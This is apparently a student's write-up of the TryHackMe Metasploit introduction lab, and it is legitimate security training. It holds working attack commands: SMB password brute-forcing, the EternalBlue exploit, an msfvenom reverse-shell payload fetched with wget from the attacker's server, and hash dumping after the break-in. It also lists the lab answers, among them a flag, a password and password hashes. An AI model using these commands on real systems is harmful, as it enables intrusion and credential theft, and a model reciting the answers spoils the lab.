# Metasploit: Introduction

## Introduction

This room walks you through the process of finding a vulnerability in a system, and exploiting that vulnerability.

## Process

### Task 2: Scanning

This task showed us a few ways to scan systems, including Metasploit modules.

#### Task 2 Questions:

**How many ports are open on the target system?**
> 5

Scanning the target with nmap showed 5 open ports.

**Using the relevant scanner, what NetBIOS name can you see?**
> ACME IT SUPPORT

**What is running on port 8000?**
> webfs/1.21

**What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.**
> leo1234

Searching for smb_login and selecting auxiliary/scanner/smb/smb_login, the ```info``` command shows we need to set SMBUser to "penny", RHOSTS to the target IP, and the PASS_FILE to the password file specified in the first task.\
After setting those with ```set SMBUser penny```, ```set RHOSTS [target IP]```, and ```set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt```, running the module gives us the password ```leo1234```.

### Task 3: The Metasploit Database

This task explained how to use the Metasploit Database, first by starting the PostgreSQL database with the command ```systemctl start postgresql```, then ```msfdb init```.\
You can then check if the database is up by launching ```msfconsole``` and runnning ```db_status```.\
You can also list workspaces using ```workspace```, add workspaces using ```workspace -a NAME```, and delete workspaces using ```workspace -d NAME```.

### Task 4: Vulnerability Scanning

#### Task 4 Questions:
**Who wrote the module that allows us to check SMTP servers for open relay?**
> Campbell Murray

Searching for smtp relay gives us the scanner/smtp/smtp_relay module. We can select it by running ```use 0```, and then use the ```info``` command to see the relevant information.

### Task 5: Exploitation

**Exploit one of the critical vulnerabilities on the target VM**\
The target machine is vulnerable to the exploit shown in the task images (ms17_010_eternalblue).\
I first open the ```msfconsole```, and search for eternalblue. The first result was the one we need (windows/smb/ms17/010/eternalblue), so I run ```use 0```.\
After running ```info```, I can see that RHOSTS has to be set to the target IP, so I do so with ```set RHOSTS [target IP]```.
I type ```run```, and a meterpreter session is eventually opened.

#### Task 5 Questions:

**What is the content of the flag.txt file?**
> THM-5455554845

Navigate through commonly used folders, I find the flag file in the user's documents folder (C:\Users\Jon\Documents), showing the contents using ```edit flag.txt```. I can then push the meterpreter session to the background using ```CTRL-Z```.

**What is the NTLM hash of the password of the user "pirate"?**
> 8ce9a3ebd1647fcc5e04025019f4b875

Now that the meterpreter session is in the background, we can leave the eternalblue module and searh for hashdump and windows: ```search hashdump windows``` (because the target machine is a windows machine) to find post/windows/gather/hashdump.\
Using that module, setting SESSION to 1 (my meterpreter session ID, checked by running the ```sessions``` command), and running prints the results we need, where the second hash on the pirate line is the one we are looking for.

### Task 6: Msfvenom

This task walks us through using msfvenom to create a reverse payload, and using that to open a meterpreter session and dump hashes of users on the system.

#### Task 6 Questions:
**Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).**\
We first create the meterpreter payload using ```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf```. The example uses port 7777, but I found that port was being used so I used port 7776. I checked this by using ```nmap [AttackBox IP]```.

**Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine).**\
This is pretty straight forward, just note that the example wget command is searching for a file named shell.elf, whereas the one we created was named rev_shell.elf. I also made the file executable after transferring it by running ```chmod +x rev_shell.elf```.

**Get a meterpreter session on the target machine.**\
We now have to use Multi Handler to receive the connection: we reopen ```msfconsole```, run ```use exploit/multi/handler```, and set our payload using ```set payload linux/x86/meterpreter/reverse_tcp```. We also set our lhost and lport values to our AttackBox IP and port 7776 respectively.\
I tried to run the file from the target machine directly but found when I switched back to the AttackBox the connection would close, so from the AttackBox I then ssh into the target machine using the credentials provided, became super user with ```sudo su```, and ran the file, establishing the connection.
I then left the meterpreter session running in the background by pressing ```CTRL-Z```.

**Use a post exploitation module to dump hashes of other users on the system.**
> $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0

Now that we have the meterpreter session running, we can leave the Multi Handler module by running ```back```, and then select the post exploitation module we want: ```use post/linux/gather/hashdump```.\
I checked the ID of the meterpreter session we opened by typing ```sessions```, and then set the session variable using ```set SESSION 1``` (the ID of my meterpreter session was 1).\
Running the post exploitation module by typing ```run``` gave the hashes we wanted!



## Conclusion and Learning Outcomes
I really enjoyed this room, since it was a very hands on demonstration of a full exploitation and post exploitation of a target system. I found this very engaging and it was very nice to get to see the whole process of using Metasploit.
